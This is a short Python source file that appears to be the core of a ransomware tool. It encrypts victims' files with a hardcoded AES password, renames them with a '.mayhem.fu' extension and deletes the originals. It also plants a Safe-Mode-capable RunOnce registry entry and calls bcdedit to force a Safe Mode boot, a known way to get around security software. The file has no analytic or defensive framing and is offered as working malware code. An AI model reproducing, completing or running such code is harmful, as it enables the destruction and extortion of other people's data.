import os.path
import pyAesCrypt
from Utils.helpers import run_detached_process,setRegistryKey,random_string,get_current_file_path,getRegistryKey
key ="Password1"
bufferSize = 64 * 1024


def xor(data, key):
    """XOR?
    # //TODO: add doc for this whole thing
    """
    return bytearray(a ^ b for a, b in zip(*map(bytearray, [data, key])))


def encrypt(path, folder, file):
    # //TODO: add doc for this whole thing
    try:
        with open(f'{path}/{folder}/{file}', 'rb') as ToEncrypt:
            with open(f'{path}/{folder}/{file}.mayhem.fu','wb') as encryptedFile:
                pyAesCrypt.encryptStream(ToEncrypt,encryptedFile,key,bufferSize)
        os.remove(f'{path}/{folder}/{file}')
    except Exception as e:
        pass
    return 0



def is_secure_boot() -> bool:
    reg_path = r'SYSTEM\CurrentControlSet\Control\SafeBoot\Option'
    key_name = 'OptionValue'
    return getRegistryKey(key_name=key_name,registry_path=reg_path,HKLM=True)



def addRun_once():
    reg_key = "*" + random_string(is_random=True)
    reg_path = r'SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce' # this does not get executed
    setRegistryKey(key_name=reg_key,value=f"{get_current_file_path()}",registry_path=reg_path,HKLM=True)
    return True


def enable_safemode():
    run_detached_process("bcdedit /set {default} safeboot network")
    return

def disable_safemod():
    run_detached_process("bcdedit /deletevalue {default} safeboot")
    return
